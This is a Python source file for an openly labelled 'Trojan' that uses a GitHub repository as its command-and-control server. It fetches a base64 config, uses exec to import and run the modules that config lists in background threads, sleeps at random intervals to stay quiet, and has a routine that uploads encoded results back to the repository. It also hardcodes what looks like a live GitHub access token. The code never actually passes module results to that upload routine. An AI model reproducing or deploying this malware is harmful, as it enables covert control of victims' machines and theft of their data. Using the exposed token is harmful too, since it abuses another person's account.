import base64
import json
import random
import sys
import threading
import time
from datetime import datetime
from github import Github  # Import PyGithub library

# Directly specify your GitHub token here
GITHUB_TOKEN = "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"  # Replace with your new token

def github_connect():
    # Use the token directly for authentication
    g = Github(GITHUB_TOKEN)
    # Replace 'RandomMf35345' with your GitHub username and 'bhptrojan' with your repository name
    return g.get_repo('RandomMf35345/bhptrojan')

def get_file_contents(dirname, module_name, repo):
    file_path = f'{dirname}/{module_name}'
    print(f"Attempting to access file: {file_path}")  # Debugging step
    try:
        # Fetch the file content
        file_content = repo.get_contents(file_path)
        return file_content.decoded_content.decode('utf-8')  # Return decoded content
    except Exception as e:
        print(f"Error: {e}")
        return None

class Trojan:
    def __init__(self, id):
        self.id = id
        self.config_file = 'abc.json'
        self.data_path = f'data/{id}/'
        self.repo = github_connect()

    def get_config(self):
        config_json = get_file_contents('config', self.config_file, self.repo)
        if config_json is None:
            return []  # If the file doesn't exist, return an empty list.

           # Fix base64 padding
        padding = len(config_json) % 4  # Calculate the amount of padding required
        if padding != 0:
            config_json += '=' * (4 - padding)
        
        config = json.loads(base64.b64decode(config_json))
        for task in config:
            if task['module'] not in sys.modules:
                exec("import %s" % task['module'])  # Dynamically import modules listed in the config
        return config

    def module_runner(self, module):
        result = sys.modules[module].run()

    def store_module_result(self, data):
        message = datetime.now().isoformat()
        remove_path = f'data/{self.id}/{message}.data'
        bindata = bytes('%r' % data, 'utf-8')
        self.repo.create_file(remove_path, message, base64.b64encode(bindata))

    def run(self):
        while True:
            config = self.get_config()
            for task in config:
                thread = threading.Thread(
                    target=self.module_runner,
                    args=(task['module'],)
                )
                thread.start()
                time.sleep(random.randint(1, 10))
            time.sleep(random.randint(30 * 60, 3 * 60 * 60))

# To start the Trojan
if __name__ == "__main__":
    # Replace with your desired Trojan ID
    trojan = Trojan(id="sample_id")
    trojan.run()
